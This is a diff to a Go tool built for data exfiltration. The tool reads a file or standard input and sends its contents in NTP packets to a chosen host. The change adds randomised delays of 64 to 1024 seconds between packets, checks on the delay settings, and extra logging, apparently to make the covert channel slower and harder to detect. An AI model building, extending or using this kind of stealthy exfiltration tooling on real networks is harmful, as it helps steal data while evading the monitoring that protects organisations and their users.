@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net"
 	"os"
 	"time"
@@ -18,15 +19,24 @@ import (
 const timeout = 5 * time.Second
 const maxTries = 5
 
+var mindelay, maxdelay *int
+
 func Main() {
 	dest := flag.String("d", "localhost:123", "dest: host to send the NTP packets to")
 	infile := flag.String("f", "-", "file: file to exfiltrate data from ('-' for STDIN)")
 	help := flag.Bool("h", false, "help: print this help")
+	mindelay = flag.Int("tm", 64, "mindelay: Minimum time (secs. >= 0) between messages sent. 0 = no delay.")
+	maxdelay = flag.Int("tM", 1024, "maxdelay: Maximum time (secs. >= mindelay >= 0) between messages sent. 0 = no delay.")
 	flag.Parse()
 
 	if *help {
 		flag.Usage()
 		return
+	}
+
+	err := checkDelays(mindelay, maxdelay)
+	if err != nil {
+		log.Fatalf("Error: %v", err)
 	}
 
 	key, err := common.GetKey()
@@ -46,6 +56,24 @@ func Main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
+}
+
+func checkDelays(mindelay, maxdelay *int) error {
+	if *mindelay < 0 {
+		return fmt.Errorf("mindelay must be 0 or greater")
+	}
+	if *mindelay > *maxdelay {
+		return fmt.Errorf("maxdelay must be greater than or equal to mindelay")
+	}
+	if *maxdelay < 0 {
+		return fmt.Errorf("maxdelay must be 0 or greater")
+	}
+	return nil
+}
+
+// Get a random sending delay between the min. and max. delays.
+func getRandomDelay() int {
+	return rand.Intn(*maxdelay - *mindelay + 1) + *mindelay
 }
 
 // Send data from stdin to the given `dest`. 
@@ -111,12 +139,17 @@ func reliableSendBuffer(buf []byte, dest *string, key []byte) error {
 
 		err := sendMessage(message, dest, key)
 		if err != nil {
-			log.Printf("Retrying message send: %v", err)
+			log.Printf("Retrying message send: %v\n", err)
 			triesLeft--
 		} else {
+			log.Printf("Successfully sent %s\n", message)
 			i += 2
 			triesLeft = maxTries
 		}
+
+		delay := getRandomDelay()
+		log.Printf("Waiting %d seconds...\n", delay)
+		time.Sleep(time.Duration(delay) * time.Second)
 	}
 
 	return nil
